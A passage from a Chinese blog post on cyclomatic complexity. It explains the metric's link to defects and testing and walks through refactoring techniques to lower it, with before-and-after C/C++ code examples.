class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">U32 <span class="title">find</span> <span class="params">(<span class="built_in">string</span> match)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> var : <span class="built_in">list</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(var == match &amp;&amp; from != INVALID_U32) <span class="keyword">return</span> INVALID_U32;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//match step1</span></span><br><span class="line">    <span class="keyword">if</span>(session == getName() &amp;&amp; key == <span class="built_in">getKey</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; kv : Map)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (kv.second == last &amp;&amp; match == kv.first)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> last;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//match step2</span></span><br><span class="line">    <span class="keyword">auto</span> var = Map.<span class="built_in">find</span>(match);</span><br><span class="line">    <span class="keyword">if</span>(var != Map.<span class="built_in">end</span>()&amp;&amp; (from != var-&gt;second)) <span class="keyword">return</span> var-&gt;second;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//match step3</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> var: Map)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((var.first, match) &amp;&amp; from != var.second)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> var.second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> INVALID_U32;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其圈复杂度为：V(G) = 1(for) + 2(if) + 2(if) + 1(for) + 2(if) + 2(if) + 1(for) + 2(if) + 1= 14</p><h1 id="4-圈复杂度的意义"><a class="markdownIt-Anchor" href="#4-圈复杂度的意义"></a> 4 圈复杂度的意义</h1><p>在缺陷成为缺陷之前捕获它们。</p><h2 id="41-圈复杂度与缺陷"><a class="markdownIt-Anchor" href="#41-圈复杂度与缺陷"></a> 4.1 圈复杂度与缺陷</h2><p>一般来说圈复杂度大于10的方法存在很大的出错风险。圈复杂度和缺陷个数有高度的正相关：<strong>圈复杂度最高的模块和方法，其缺陷个数也可能最多。</strong></p><h2 id="42-圈复杂度与结构化测试"><a class="markdownIt-Anchor" href="#42-圈复杂度与结构化测试"></a> 4.2 圈复杂度与结构化测试</h2><p>此外，它还为测试设计提供很好的参考。一个好的用例设计经验是：**创建数量与被测代码圈复杂度值相等的测试用例，**以此提升用例对代码的分支覆盖率。</p><h2 id="43-圈复杂度与tdd"><a class="markdownIt-Anchor" href="#43-圈复杂度与tdd"></a> 4.3 圈复杂度与TDD</h2><p>TDD（测试驱动的开发，test-driven development)和低<strong>CC</strong>值之间存在着紧密联系。在编写测试时，开发人员会考虑代码的可测试性，倾向于编写简单的代码，因为复杂的代码难以测试。因此TDD的“代码、测试、代码、测试” 循环将导致频繁重构，驱使非复杂代码的开发。</p><h2 id="44-圈复杂度与遗留代码"><a class="markdownIt-Anchor" href="#44-圈复杂度与遗留代码"></a> 4.4 圈复杂度与遗留代码</h2><p>对于遗留代码的维护或重构，测量圈复杂度特别有价值。一般使用圈复杂度作为提升代码质量的切入点。</p><h2 id="45-圈复杂度与ci"><a class="markdownIt-Anchor" href="#45-圈复杂度与ci"></a> 4.5 圈复杂度与CI</h2><p>在持续集成环境中，可以基于时间变化维度来评估模块或函数的复杂度和增长值。如果<strong>CC</strong>值在不断增长，那么应该开展两项活动：</p><ol><li>确保相关测试的有效性，减少故障风险。</li><li>评估重构必要性和具体方式，以降低出现代码维护问题的可能性。</li></ol><h2 id="46-圈复杂度和软件质量"><a class="markdownIt-Anchor" href="#46-圈复杂度和软件质量"></a> 4.6 圈复杂度和软件质量</h2><table><thead><tr><th style="text-align:left">圈复杂度</th><th style="text-align:left">代码状况</th><th style="text-align:left">可测性</th><th style="text-align:left">维护成本</th></tr></thead><tbody><tr><td style="text-align:left">1-10</td><td style="text-align:left">清晰、结构化</td><td style="text-align:left">高</td><td style="text-align:left">低</td></tr><tr><td style="text-align:left">10-20</td><td style="text-align:left">复杂</td><td style="text-align:left">中</td><td style="text-align:left">中</td></tr><tr><td style="text-align:left">20-30</td><td style="text-align:left">非常复杂</td><td style="text-align:left">低</td><td style="text-align:left">高</td></tr><tr><td style="text-align:left">&gt;30</td><td style="text-align:left">不可读</td><td style="text-align:left">不可测</td><td style="text-align:left">非常高</td></tr></tbody></table><h1 id="5-降低圈复杂度的方法"><a class="markdownIt-Anchor" href="#5-降低圈复杂度的方法"></a> 5 降低圈复杂度的方法</h1><h2 id="51-重新组织你的函数"><a class="markdownIt-Anchor" href="#51-重新组织你的函数"></a> 5.1 重新组织你的函数</h2><h3 id="511-技巧1-提炼函数"><a class="markdownIt-Anchor" href="#511-技巧1-提炼函数"></a> 5.1.1 技巧1 提炼函数</h3><p>有一段代码可以被组织在一起并独立出来:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Example</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>( val &gt; MAX_VAL)</span><br><span class="line">&#123;</span><br><span class="line">val = MAX_VAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; val; i++)</span><br><span class="line">&#123;</span><br><span class="line">doSomething(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将这段代码放进一个独立函数中，并让函数名称解释该函数的用途:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getValidVal</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>( val &gt; MAX_VAL)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> MAX_VAL;</span><br><span class="line">&#125; </span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doSomethings</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; val; i++)</span><br><span class="line">&#123;</span><br><span class="line">doSomething(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Example</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    doSomethings(getValidVal(val));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后还要重新审视函数内容是否在统一层次上。</p><h3 id="512-技巧2-替换算法"><a class="markdownIt-Anchor" href="#512-技巧2-替换算法"></a> 5.1.2 技巧2 替换算法</h3><p>把某个算法替换为另一个更清晰的算法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">foundPerson</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; peoples)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; people : peoples) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (people == <span class="string">"Don"</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"Don"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (people == <span class="string">"John"</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"John"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (people == <span class="string">"Kent"</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"Kent"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将函数实现替换为另一个算法:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">foundPerson</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; people)</span></span>&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="built_in">string</span>&gt;candidates&#123;</span><br><span class="line">    &#123; <span class="string">"Don"</span>, <span class="string">"Don"</span>&#125;,</span><br><span class="line">    &#123; <span class="string">"John"</span>, <span class="string">"John"</span>&#125;,</span><br><span class="line">    &#123; <span class="string">"Kent"</span>, <span class="string">"Kent"</span>&#125;,</span><br><span class="line">       &#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; people : peoples) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">auto</span>&amp; it = candidates.<span class="built_in">find</span>(people);</span><br><span class="line">    <span class="keyword">if</span>(it != candidates.<span class="built_in">end</span>())</span><br><span class="line">        <span class="keyword">return</span> it-&gt;second;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所谓的表驱动。</p><h2 id="52-简化条件表达式"><a class="markdownIt-Anchor" href="#52-简化条件表达式"></a> 5.2 简化条件表达式</h2><h3 id="521-技巧3-逆向表达"><a class="markdownIt-Anchor" href="#521-技巧3-逆向表达"></a> 5.2.1 技巧3 逆向表达</h3><p>在代码中可能存在条件表达如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((condition1() &amp;&amp; condition2()) || !condition1())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应用逆向表达调换表达顺序后效果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition1() &amp;&amp; !condition2())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><h3 id="522-技巧4-分解条件"><a class="markdownIt-Anchor" href="#522-技巧4-分解条件"></a> 5.2.2 技巧4 分解条件</h3><p>在代码中存在复杂的条件表达：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(date.before (SUMMER_START) || date.after(SUMMER_END))</span><br><span class="line">    charge = quantity * _winterRate + _winterServiceCharge;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    charge = quantity * _summerRate;</span><br></pre></td></tr></table></figure><p>从if、then、else三个段落中分别提炼出独立函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(notSummer(date))</span><br><span class="line">    charge = winterCharge(quantity);</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    charge = summerCharge (quantity);</span><br></pre></td></tr></table></figure><h3 id="523-技巧5-合并条件"><a class="markdownIt-Anchor" href="#523-技巧5-合并条件"></a> 5.2.3 技巧5 合并条件</h3><p>一系列条件判断，都得到相同结果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">disabilityAmount</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (_seniority &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (_monthsDisabled &gt; <span class="number">12</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (_isPartTime) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// compute the disability amount</span></span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>将这些判断合并为一个条件式，并将这个条件式提炼成为一个独立函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">disabilityAmount</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (isNotEligableForDisability()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// compute the disability amount</span></span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><h3 id="524-技巧6-移除控制标记"><a class="markdownIt-Anchor" href="#524-技巧6-移除控制标记"></a> 5.2.4 技巧6 移除控制标记</h3><p>在代码逻辑中，有时候会使用bool类型作为逻辑控制标记：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">checkSecurity</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; peoples)</span> </span>&#123;</span><br><span class="line"><span class="keyword">bool</span> found = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp; people : peoples) </span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">if</span> (! found) &#123;</span><br><span class="line"><span class="keyword">if</span> (people == <span class="string">"Don"</span>)&#123;</span><br><span class="line">sendAlert();</span><br><span class="line">found = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (people == <span class="string">"John"</span>)&#123;</span><br><span class="line">   sendAlert();</span><br><span class="line">   found = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用break和return取代控制标记：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">checkSecurity</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; peoples)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp; people : peoples)</span><br><span class="line">&#123;     </span><br><span class="line"><span class="keyword">if</span> (people == <span class="string">"Don"</span> || people == <span class="string">"John"</span>)</span><br><span class="line">&#123;</span><br><span class="line">sendAlert();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="525-技巧7-以多态取代条件式"><a class="markdownIt-Anchor" href="#525-技巧7-以多态取代条件式"></a> 5.2.5 技巧7 以多态取代条件式</h3><p>条件式根据对象类型的不同而选择不同的行为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">getSpeed</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> EUROPEAN:</span><br><span class="line">            <span class="keyword">return</span> getBaseSpeed();</span><br><span class="line">        <span class="keyword">case</span> AFRICAN:</span><br><span class="line">            <span class="keyword">return</span> getBaseSpeed() - getLoadFactor() *_numberOfCoconuts;</span><br><span class="line">        <span class="keyword">case</span> NORWEGIAN_BLUE:</span><br><span class="line">            <span class="keyword">return</span> (_isNailed) ? <span class="number">0</span> : getBaseSpeed(_voltage);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException (<span class="string">"Should be unreachable"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将整个条件式的每个分支放进一个子类的重载方法中，然后将原始函数声明为抽象方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bird</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">double</span> <span class="title">getSpeed</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getBaseSpeed</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EuropeanBird</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getSpeed</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getBaseSpeed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AfricanBird</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getSpeed</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getBaseSpeed() - getLoadFactor() *_numberOfCoconuts;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getLoadFactor</span><span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">double</span> _numberOfCoconuts;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NorwegianBlueBird</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getSpeed</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (_isNailed) ? <span class="number">0</span> : getBaseSpeed(_voltage);</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">bool</span> _isNailed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="53-简化函数调用"><a class="markdownIt-Anchor" href="#53-简化函数调用"></a> 5.3 简化函数调用</h2><h3 id="531-技巧8-读写分离"><a class="markdownIt-Anchor" href="#531-技巧8-读写分离"></a> 5.3.1 技巧8 读写分离</h3><p>某个函数既返回对象状态值，又修改对象状态:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Customer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getTotalOutstandingAndSetReadyForSummaries</span><span class="params">(<span class="keyword">int</span> number)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>建立两个不同的函数，其中一个负责查询，另一个负责修改:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Customer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getTotalOutstanding</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">SetReadyForSummaries</span><span class="params">(<span class="keyword">int</span> number)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="532-技巧9-参数化方法"><a class="markdownIt-Anchor" href="#532-技巧9-参数化方法"></a> 5.3.2 技巧9 参数化方法</h3><p>若干函数做了类似的工作，但在函数本体中却 包含了不同的值:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Dollars <span class="title">baseCharge</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> result = Math.<span class="built_in">min</span>(lastUsage(),<span class="number">100</span>) * <span class="number">0.03</span>;</span><br><span class="line">    <span class="keyword">if</span> (lastUsage() &gt; <span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        result += (Math.<span class="built_in">min</span> (lastUsage(),<span class="number">200</span>) - <span class="number">100</span>) * <span class="number">0.05</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lastUsage() &gt; <span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        result += (lastUsage() - <span class="number">200</span>) * <span class="number">0.07</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Dollars (result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>建立单一函数，以参数表达那些不同的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Dollars <span class="title">baseCharge</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> result = usageInRange(<span class="number">0</span>, <span class="number">100</span>) * <span class="number">0.03</span>;</span><br><span class="line">    result += usageInRange (<span class="number">100</span>,<span class="number">200</span>) * <span class="number">0.05</span>;</span><br><span class="line">    result += usageInRange (<span class="number">200</span>, Integer.MAX_VALUE) * <span class="number">0.07</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Dollars (result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">usageInRange</span><span class="params">(<span class="keyword">int</span> start, <span class="keyword">int</span> <span class="built_in">end</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (lastUsage() &gt; start) </span><br><span class="line">        <span class="keyword">return</span> Math.<span class="built_in">min</span>(lastUsage(),<span class="built_in">end</span>) -start;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="533-技巧10-以明确函数取代参数"><a class="markdownIt-Anchor" href="#533-技巧10-以明确函数取代参数"></a> 5.3.3 技巧10 以明确函数取代参数</h3><p>函数实现完全取决于参数值而采取不同反应：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setValue</span> <span class="params">(<span class="built_in">string</span> name, <span class="keyword">int</span> value)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">"height"</span>)</span><br><span class="line">        _height = value;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="string">"width"</span>)</span><br><span class="line">        _width = value;</span><br><span class="line">    Assert.shouldNeverReachHere();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>针对该参数的每一个可能值，建立一个独立函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setHeight</span><span class="params">(<span class="keyword">int</span> arg)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _height = arg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setWidth</span> <span class="params">(<span class="keyword">int</span> arg)</span> </span></span><br><span class="line"><span 